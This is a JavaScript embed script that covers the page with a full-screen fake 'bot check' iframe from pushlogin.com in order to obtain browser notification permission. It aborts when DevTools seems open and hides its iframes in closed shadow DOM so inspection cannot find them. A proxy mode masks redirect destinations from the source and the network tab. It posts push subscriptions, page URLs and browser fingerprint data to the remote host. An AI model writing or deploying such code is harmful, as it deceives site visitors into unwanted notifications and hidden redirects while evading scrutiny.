(function () {
  var cfg = window.PUSH_CONFIG || {};
  var appUrl = cfg.appUrl || 'https://pushlogin.com';

  // ── Anti-DevTools: abort if inspector panel is open ─────────────────────
  try {
    if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) return;
  } catch (e) {}

  // ── Already subscribed? skip ─────────────────────────────────────────────
  var subKey = 'push-sub-' + (cfg.landingId || '');
  if (localStorage.getItem(subKey) === '1') return;

  // ── Session token (HMAC challenge) ───────────────────────────────────────
  var _sessionToken = null;
  var _challengePath = ['/api/analytics', '/session'].join('');
  fetch(appUrl + _challengePath, { method: 'GET', cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) { if (d && d.s && d.n) _sessionToken = d.s + ':' + d.n; })
    .catch(function () {});

  // ── Shadow DOM host — iframe is INVISIBLE to document.querySelector ──────
  var _host = document.createElement('span');
  document.body.appendChild(_host);
  var _shadow = _host.attachShadow({ mode: 'closed' });

  // ── Build bot-check URL dynamically ─────────────────────────────────────
  var _p = ['/landing', '/bot', '-check'].join('');
  var _q = '?embedded=true'
    + '&domain=' + encodeURIComponent(cfg.domain || '')
    + '&landingId=' + encodeURIComponent(cfg.landingId || '')
    + '&vapidKey=' + encodeURIComponent(cfg.vapidKey || '')
    + '&allowRedirect=' + encodeURIComponent((cfg.redirects && cfg.redirects.onAllow) || '')
    + '&blockRedirect=' + encodeURIComponent((cfg.redirects && cfg.redirects.onBlock) || '');
  var botCheckUrl = appUrl + _p + _q;

  // ── Bot-check iframe inside Shadow DOM ───────────────────────────────────
  var iframe = document.createElement('iframe');
  iframe.src = botCheckUrl;
  iframe.setAttribute('allow', 'notifications');
  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;border:none;background:#f0f2f5';
  _shadow.appendChild(iframe);
  document.body.style.overflow = 'hidden';

  var isRequestingPermission = false;

  // ── Handle postMessages from bot-check iframe ────────────────────────────
  window.addEventListener('message', function (e) {
    if (!e.data || !e.data.type) return;
    if (e.origin !== appUrl) return;
    if (e.data.type === 'bot-check-verified') {
      handleAllow(e.data);
    } else if (e.data.type === 'request-permission-firefox') {
      handleFirefoxEdge(e.data);
    } else if (e.data.type === 'bot-check-completed') {
      if (e.data.permission === 'granted') {
        cleanup();
        afterAllow();
      } else {
        handleBlock();
      }
    }
  });

  // ── Cleanup: removes shadow host (and iframe inside it) from DOM ─────────
  function cleanup() {
    _host.remove();
    document.body.style.overflow = '';
  }

  // ── After allow: redirect OR show proxy content ──────────────────────────
  function afterAllow() {
    var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
    if (!dest) return;
    var mode = (cfg.redirects && cfg.redirects.allowMode) || 'redirect';
    if (mode === 'proxy') {
      showProxyContent(dest);
    } else {
      window.location.href = dest;
    }
  }

  // ── After block: redirect OR show proxy content ──────────────────────────
  function handleBlock() {
    cleanup();
    var dest = (cfg.redirects && cfg.redirects.onBlock) || null;
    if (!dest) return;
    var mode = (cfg.redirects && cfg.redirects.blockMode) || 'redirect';
    if (mode === 'proxy') {
      showProxyContent(dest);
    } else {
      window.location.href = dest;
    }
  }

  // ── Proxy content mode ───────────────────────────────────────────────────
  // Fetches destination page via server proxy → renders as blob iframe in Shadow DOM
  // Destination URL never appears in source, network tab shows pushlogin.com/api/proxy
  // URL bar stays as customer domain (e.g. notify-alerts.com)
  function showProxyContent(url) {
    var proxyUrl = appUrl + '/api/proxy?u=' + btoa(url);
    fetch(proxyUrl)
      .then(function (r) {
        if (!r.ok) throw new Error('proxy failed');
        return r.text();
      })
      .then(function (html) {
        var blob = new Blob([html], { type: 'text/html' });
        var blobUrl = URL.createObjectURL(blob);

        // Content iframe in its own Shadow DOM — invisible to DOM inspection
        var contentHost = document.createElement('span');
        document.body.appendChild(contentHost);
        var contentShadow = contentHost.attachShadow({ mode: 'closed' });

        var contentFrame = document.createElement('iframe');
        contentFrame.src = blobUrl;
        contentFrame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:2147483646';
        contentShadow.appendChild(contentFrame);
        document.body.style.overflow = 'hidden';
      })
      .catch(function () {
        // Fallback to direct redirect if proxy fails
        window.location.href = url;
      });
  }

  function handleAllow(data) {
    if (Notification.permission === 'granted') {
      registerAndSubscribe(data);
      return;
    }
    if (Notification.permission === 'denied') {
      handleBlock();
      return;
    }
    Notification.requestPermission().then(function (permission) {
      if (permission === 'granted') {
        registerAndSubscribe(data);
      } else {
        handleBlock();
      }
    }).catch(function () { handleBlock(); });
  }

  function handleFirefoxEdge(data) {
    if (isRequestingPermission) return;
    isRequestingPermission = true;

    if (Notification.permission === 'denied') {
      handleBlock();
      isRequestingPermission = false;
      return;
    }
    if (Notification.permission === 'granted') {
      registerAndSubscribe(data);
      isRequestingPermission = false;
      return;
    }

    if (/edg/i.test(navigator.userAgent)) {
      handleBlock();
      isRequestingPermission = false;
      return;
    }

    var permResult;
    try {
      permResult = Notification.requestPermission();
    } catch (err) {
      Notification.requestPermission(function (p) {
        isRequestingPermission = false;
        if (p === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
      });
      return;
    }

    if (permResult && typeof permResult.then === 'function') {
      permResult.then(function (p) {
        isRequestingPermission = false;
        if (p === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
      }).catch(function () { isRequestingPermission = false; handleBlock(); });
    } else {
      isRequestingPermission = false;
      if (permResult === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
    }
  }

  function registerAndSubscribe(data) {
    navigator.serviceWorker.register('/push-sw.js', { updateViaCache: 'none' })
      .then(function (reg) {
        return navigator.serviceWorker.ready.then(function () { return reg; });
      })
      .then(function (reg) {
        return reg.pushManager.getSubscription().then(function (existing) {
          if (existing) return existing;
          return reg.pushManager.subscribe({
            userVisibleOnly: true,
            applicationServerKey: urlBase64ToUint8Array(cfg.vapidKey)
          });
        });
      })
      .then(function (sub) { return sendToServer(sub, data); })
      .then(function () {
        localStorage.setItem(subKey, '1');
        cleanup();
        afterAllow();
      })
      .catch(function () {
        cleanup();
        afterAllow();
      });
  }

  function sendToServer(sub, data) {
    var j = sub.toJSON();
    var bi = (data && data.browserInfo) || getBrowserInfo();
    var headers = { 'Content-Type': 'application/json' };
    if (_sessionToken) headers['x-session-id'] = _sessionToken;
    return fetch(appUrl + '/api/clients', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify({
        subscription: { endpoint: j.endpoint, keys: j.keys },
        landingId: cfg.landingId,
        domain: cfg.domain,
        url: window.location.href,
        accessStatus: 'allowed',
        browserInfo: bi,
        location: (data && data.location) || {}
      })
    });
  }

  function getBrowserInfo() {
    var ua = navigator.userAgent;
    var b = 'Unknown', o = 'Unknown';
    if (/Chrome/.test(ua) && !/Chromium|Edge|OPR/.test(ua)) b = 'Chrome';
    else if (/Firefox/.test(ua)) b = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) b = 'Safari';
    else if (/Edg/.test(ua)) b = 'Edge';
    else if (/OPR|Opera/.test(ua)) b = 'Opera';
    if (/Windows/.test(ua)) o = 'Windows';
    else if (/Mac/.test(ua)) o = 'macOS';
    else if (/Android/.test(ua)) o = 'Android';
    else if (/iPhone|iPad/.test(ua)) o = 'iOS';
    else if (/Linux/.test(ua)) o = 'Linux';
    return {
      browser: b, version: 'Unknown', os: o,
      userAgent: ua, language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform || 'Unknown'
    };
  }

  function urlBase64ToUint8Array(b64) {
    var pad = '='.repeat((4 - b64.length % 4) % 4);
    var raw = atob((b64 + pad).replace(/-/g, '+').replace(/_/g, '/'));
    var arr = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
    return arr;
  }
})();
